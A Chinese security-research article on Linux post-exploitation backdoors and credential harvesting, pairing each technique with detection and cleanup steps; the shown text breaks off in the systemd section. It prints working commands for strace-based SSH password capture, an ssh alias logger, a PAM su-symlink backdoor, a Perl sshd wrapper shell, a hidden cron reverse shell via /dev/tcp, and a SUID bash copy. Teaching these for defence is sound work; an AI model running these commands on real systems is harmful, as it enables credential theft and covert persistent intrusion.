---
title: 【安全研究】Linux后渗透常见后门驻留方式分析
url: https://www.4hou.com/posts/17OG
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2022-11-10
fetch_date: 2025-10-03T22:13:20.162120
---

# 【安全研究】Linux后渗透常见后门驻留方式分析

【安全研究】Linux后渗透常见后门驻留方式分析 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 【安全研究】Linux后渗透常见后门驻留方式分析

安全狗
[行业](https://www.4hou.com/category/industry)
2022-11-09 16:51:11

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)154147

收藏

导语：本文将对Linux下常见的权限维持技术和凭据收集技术进行解析，希望能对从事攻防对抗研究的小伙伴有所帮助。

**一、引言**

当RedTeam拿下了一台服务器并获取到系统较高权限，但不知道服务器的凭证时，RedTeam会采用怎样的技术获取系统凭证呢？又或者，在RedTeam拿下一台服务器，为达到长久控制的目的而专门定制持久化后门（免杀肯定是必须的）的前提下，他们会如何结合系统自身的某些特性，达到持久化控制的效果？BlueTeam在应急响应的过程中，又该如何尽早地排查出这些后门？为尽到“知己知彼，百战不殆”，本文将对Linux下常见的权限维持技术和凭据收集技术进行解析，希望能对从事攻防对抗研究的小伙伴有所帮助。

**二、Strace获取登陆凭证**

1、strace获取登陆凭证原理

凭证将会通过strace追踪到系统sshd进程，并将追踪到的信息保存到log文件，这些信息中包含了系统明文密码以及ssh私钥。

2、strace获取登陆凭证实现

strace获取登陆凭证利用条件包括：

内核版本>Linux Kernel 3.4支持完全限制或禁用ptrace的功能。

具有kernel.yama.ptrace\_scope限制和禁用。

具体实现

获取sshd进程明文密码。可使用括号执行程序，然后退出当前shell，并用ssh登录其他主机。

|  |
| --- |
| (strace-f-F-p`ps aux|grep"sshd-D"|grep-v grep|awk{'print$2'}`-t-e trace=read,write-s 4096 2>/tmp/.sshd.log&) |

![](https://bcn.135editor.com/files/users/455/4552598/202209/g54JEjCf_XVPG.png)

strace捕获到的凭证将会保存在/tmp/.sshd.log文件下：

![](https://bcn.135editor.com/files/users/455/4552598/202209/nO7rvySB_4SDf.png)

3、Strace获取登陆凭证检测响应

1）使用ps工具查看系统中的strace进程。

![](https://bcn.135editor.com/files/users/455/4552598/202209/DwSq49dO_4tX7.png)

图3

2）使用kill工具阻断进程运行。

![](https://bcn.135editor.com/files/users/455/4552598/202209/JuZLFyzf_rKHM.png)

图4

**三、Alias获取登陆凭证**

1、Alias获取登陆凭证原理

给指定程序设置命令别名，使运行指定程序时自动strace读写系统调用，收集登录凭证。

2、Alias获取登陆凭证实现

1）在终端中执行。

|  |
| --- |
| #添加命令别名  vi~/.bashrc或者/etc/bashrc  alias ssh='strace-o/tmp/.sshpwd-`date'+%d%h%m%s'`.log-e read,write,connect-s2048 ssh'  #使命令别名立即生效  source~/.bashrc |

![](https://bcn.135editor.com/files/users/455/4552598/202209/X4fPIXPe_7CLs.png)图5

2）通过查看日志文件，能看到有系统凭证的信息。

![](https://bcn.135editor.com/files/users/455/4552598/202209/7ObReQQq_hDWq.png)

图6

3、Alias获取登陆凭证检测响应

1）使用alias工具即可发现异常

![](https://bcn.135editor.com/files/users/455/4552598/202209/XDKup6de_d5KO.png)

图7

2）打开.bashrc文件，查看并清除后门命令。

![](https://bcn.135editor.com/files/users/455/4552598/202209/qhAjNYtj_SeXC.png)图8

**四、SSH软连接后门**

1、SSH软连接后门原理

软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），su在pam\_rootok只检测uid 0即认证成功，导致了可以使用任意密码登录。

2、SSH软连接后门实现

1）在靶机上安装ssh后门，执行。

|  |
| --- |
| ln-sf/usr/sbin/sshd/usr/local/su;/usr/local/su-oPort=12345 |

2）攻击机中用ssh终端连接工具，密码随意填写即可实现任意密码登录。

![](https://bcn.135editor.com/files/users/455/4552598/202209/8KZ7GJIG_I937.png)

图9

笔者在测试环境下还发现有”chsh”、”chfn”等shell程序包含pam\_rootok.so，均能够用于SSH软连接后门的植入。

![](https://bcn.135editor.com/files/users/455/4552598/202209/gZHmSDrd_SaT6.png)

图10

3、SSH软连接后门检测响应

1）查看系统当前端口状态。

这类后门会开启监听端口，我们可以先查看/etc/pam.d/目录下有哪些文件包含该配置，然后通过管道符找到异常端口及进程，再通过进程找到异常文件、杀掉进程、关闭PAM认证即可。

|  |
| --- |
| find/etc/pam.d/|xargs grep"pam\_rootok.so"  netstat-antlp|grep-E"su|chsh|chfn|runuser" |

![](https://bcn.135editor.com/files/users/455/4552598/202209/vwGvGNKn_ApUN.png)图11

2）查看系统登录日志

![](https://bcn.135editor.com/files/users/455/4552598/202209/JCJsvKmf_uPAj.png)图12

**五、SSH公钥免密登陆后门**

1、公钥免密后门原理

ssh无密码登录要使用公钥与私钥。linux下可以用ssh-keygen生成公钥/私钥，即利用密钥认证登录。

2、公钥免密登录后门实现

1）在攻击机上生成公钥文件，“回车”默认配置。

|  |
| --- |
| ssh-keygen-t rsa |

2）将攻击机上的id\_rsa.pub文件拷贝至靶机。

|  |
| --- |
| 1.ftp、scp等工具上传至靶机或者U盘植入；  2.将公钥文件放置vps服务器，然后靶机用wget/curl下载；  3.各类可用于远程传输的工具均可（如：nc）。 |

![](https://bcn.135editor.com/files/users/455/4552598/202209/mIaurNHT_qTXy.png)

图13

3）攻击机ssh连接靶机，无需密码认证。

![](https://bcn.135editor.com/files/users/455/4552598/202209/NdzVURg5_CVWW.png)图14

3、公钥免密登陆后门检测响应

1）查看系统当前登录状态。

![](https://bcn.135editor.com/files/users/455/4552598/202209/bIJORB6p_qmrK.png)图15

**六、SSH wrapper后门**

1、SSH wrapper后门原理

Linux中init首先启动的是/usr/sbin/sshd，原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。如果这个子进程的标准输入输出已被重定向，那么getpeername能获取到客户端的TCP端口，将会派生给执行sh命令执行的权限。简而言之就是反弹shell，与常见的反弹shell不同的是，SSH wrapper后门通过长连接反弹shell的方式，使得攻击者在退出终端后仍然能进行连接。

2、SSH wrapper后门实现

1）在靶机（服务端）中执行监听，终端中执行。

|  |
| --- |
| cd/usr/sbin/  mv sshd../bin/  echo'#!/usr/bin/perl'>sshd  echo'exec"/bin/sh"if(getpeername(STDIN)=~/^..4A/);'>>sshd  echo'exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV,'>>sshd  chmod u+x sshd  /etc/init.d/sshd restart |

2）在攻击机（客户端）中执行连接命令，获得一个命令执行权限的shell。

![](https://bcn.135editor.com/files/users/455/4552598/202209/p9aINICH_46T2.png)图16

3、SSH wrapper后门检测响应

1）查看sshd文件修改状况。

|  |
| --- |
| ls-al/usr/sbin/sshd  cat/usr/sbin/sshd |

![](https://bcn.135editor.com/files/users/455/4552598/202209/vD4XAxK7_THsz.png)

图17

2）清除SSH wrapper后门。

通过重装ssh服务清除SSH wrapper后门。

**七、Cron后门**

1、Cron后门原理

crontab命令用于设置周期性被执行的指令，可以把cron设置为开机时自动启动。攻击者将恶意代码或程序隐藏在系统磁盘中，并由计划任务调用时启动它们。

2、Cron后门实现

1）平平无奇的Cron后门。

|  |
| --- |
| (crontab-l;echo'\*/1\*\*\*\*/bin/bash/tmp/1.sh;/bin/bash--noprofile-i')|crontab- |

能用crontab-l命令查看到具体内容。

![](https://bcn.135editor.com/files/users/455/4552598/202209/jvUvc95z_wu6n.png)图18

2）隐蔽的Cron后门。

|  |
| --- |
| (crontab-l;printf"\*/1\*\*\*\*bash-i>&/dev/tcp/ip/port 0>&1;/bin/bash--noprofile-i;\rno crontab for`whoami`%100c\n")|crontab- |

用crontab-l命令则无法查看到具体内容。

![](https://bcn.135editor.com/files/users/455/4552598/202209/bMS6OTn7_fhHM.png)图19

这是因为利用到了cat工具的特性。cat默认支持一些如\r回车符、\n换行符、\f换页符等，也就是这些符号导致的能够隐藏命令。

3）攻击机获得shell连接。

![](https://bcn.135editor.com/files/users/455/4552598/202209/TjwNkTrR_weU3.png)图20

3、Cron后门检测响应

1）查看可疑的计划任务。

|  |
| --- |
| crontab-e |

2）使用vim命令在cron创建的文件下查找并清除恶意代码。

![](https://bcn.135editor.com/files/users/455/4552598/202209/Q2S37QW9_rHUn.png)图21

**八、SUID Shell后门**

1、SUID Shell后门原理

Suid shell是一种可用于以拥有者权限运行的shell。攻击者将原有的bash进程copy并隐藏，给予可执行的权限，达到隐藏后门的目的。

2、SUID Shell后门实现

1）在终端中执行如下命令。

|  |
| --- |
| #cp/bin/bash/tmp/shell  #chmod u+s/tmp/shell  用普通权限用户执行shell程序。  $/tmp/shell-p |

![](https://bcn.135editor.com/files/users/455/4552598/202209/Vw9LfSb8_Rf7u.png)

图22

3、SUID Shell后门检测响应

1）在Linux中查找SUID设置的文件。

![](https://bcn.135editor.com/files/users/455/4552598/202209/WqQKhB8r_zdCZ.png)

图23

2）取消shell程序的s权限。

|  |
| --- |
| chmod u-s/tmp/shell |

**九、Tcp wrapper后门**

1、Tcp wrapper后门原理

TCP\_Wrappers(一个工作在应用层的安全工具)，通过修改配置文件hosts.allow，实现tcpd（Tcp Wrapper的守护进程）的截获请求。每当有ssh的连接请求时，如若请求满足配置文件中的规则，则放行，否则中断连接，配置文件中可配置执行命令。

2、Tcp wrapper后门实现

1）编辑配置文件，并写入恶意代码。

![](https://bcn.135editor.com/files/users/455/4552598/202209/KeQY5GuV_uxKv.png)

图24

2）在攻击机上开启本地端口监听。

![](https://bcn.135editor.com/files/users/455/4552598/202209/VMU4SmX3_9YTB.png)

图25

3）连接目标服务器的22端口，触发后门，无需输入密码，监听端口将会获得shell连接。

![](https://bcn.135editor.com/files/users/455/4552598/202209/Tzc7PvCj_fzmp.png)

图26

3、Tcp wrapper后门检测响应

1）在/etc/hosts.allow文件中查找并删除恶意代码。

![](https://bcn.135editor.com/files/users/455/4552598/202209/Vy9uz2HG_rq7c.png)

图27

**十、Systemd服务后门**

1、Systemd服务后门原理

Linux下的服务启动后门，可创建或配置系统服务文件中的Exe...